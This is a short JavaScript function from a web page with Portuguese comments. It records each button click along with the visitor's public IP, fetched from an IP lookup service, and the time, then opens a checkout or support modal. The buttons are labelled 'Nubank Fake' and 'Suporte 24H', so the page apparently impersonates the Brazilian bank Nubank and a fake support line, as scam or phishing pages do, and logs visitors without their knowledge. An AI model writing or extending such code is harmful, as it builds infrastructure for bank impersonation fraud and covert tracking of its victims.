async function clicarBotaoLink(tipo) { await carregarEstado(); // Puxa o IP real do usuário no momento do clique let ipUsuario = "IP Oculto"; try { let respostaIp = await fetch('https://api.ipify.org?format=json'); let dadosIp = await respostaIp.json(); ipUsuario = dadosIp.ip; } catch (err) { ipUsuario = "IP não capturado"; } dadosSite.cliques = (parseInt(dadosSite.cliques) || 0) + 1; if (!Array.isArray(dadosSite.logsCliques)) dadosSite.logsCliques = []; const nomeBotao = tipo === 'nubank' ? 'Nubank Fake' : 'Suporte 24H'; const horarioAtual = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }); // Salva o clique registrando o botão, o horário e o IP do visitante dadosSite.logsCliques.push({ botao: nomeBotao, hora: horarioAtual, ip: ipUsuario }); await salvarEstado(); if (tipo === 'nubank') { document.getElementById('modalCheckout').classList.remove('hidden'); document.body.style.overflow = 'hidden'; } else if (tipo === 'suporte') { document.getElementById('modalSuporte').classList.remove('hidden'); document.body.style.overflow = 'hidden'; } }
